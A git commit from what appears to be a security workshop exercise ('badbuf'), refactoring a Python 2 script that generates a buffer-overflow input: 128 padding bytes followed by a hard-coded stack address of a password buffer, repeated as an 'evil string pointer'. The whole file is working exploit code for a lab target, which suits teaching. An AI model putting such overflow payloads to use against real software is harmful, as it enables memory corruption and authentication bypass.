042513d9ebb0a2debe000076642875c915a0daf8
Harry <RedAndBlueEraser@outlook.com>
2016-03-31 07:38:51 +0000

    made gen_input.py from week 4 so that memory address can be easily changed

--- workshop/badbuf/gen_input.py
+++ workshop/badbuf/gen_input.py
@@ -1,13 +1,34 @@
-# 0x7fffffffe140 hexa to binary for each byte, then convert to character
-bytes = [0b00000000, 0b00000000, 0b01111111, 0b11111111, 0b11111111, 0b11111111, 0b11100001, 0b01000000]
-bytes.reverse()
+NUM_OF_BITS_IN_BYTE = 8
+NUM_OF_BYTES_IN_WORD = 8
+NUM_OF_BITS_IN_WORD = NUM_OF_BITS_IN_BYTE * NUM_OF_BYTES_IN_WORD
+
+# memory address of pw
+MEM_ADDR = 0x7fffffffe140
+# convert memory address from hexadecimal to binary (string of length word size
+# stripped of "0b" in front)
+mem_addr_as_bin = bin(MEM_ADDR)[2:].zfill(NUM_OF_BITS_IN_WORD)
+# convert memory address from binary to bytes
+mem_addr_as_bytes = list(
+    int(
+        mem_addr_as_bin[i:i+NUM_OF_BITS_IN_BYTE], 2
+        ) for i in range(0, len(mem_addr_as_bin), NUM_OF_BITS_IN_BYTE)
+    )
+
+# reverse bytes
+mem_addr_as_bytes.reverse()
+
+# convert bytes to characters
 i = 0
-while i < len(bytes):
-    bytes[i] = chr(bytes[i])
+while i < len(mem_addr_as_bytes):
+    mem_addr_as_bytes[i] = chr(mem_addr_as_bytes[i])
     i += 1
-# repeat byte sequence for evil string pointer
-bytes *= 2
+
+# repeat bytes for evil string pointer
+mem_addr_as_bytes *= 2
+
 # 128 bytes for string length
-overflow_str = ('a'*128 + ''.join(bytes))
+overflow_str = ('a'*128 + ''.join(mem_addr_as_bytes))
+
+# print output
 print overflow_str
 print 'ownz_u!'
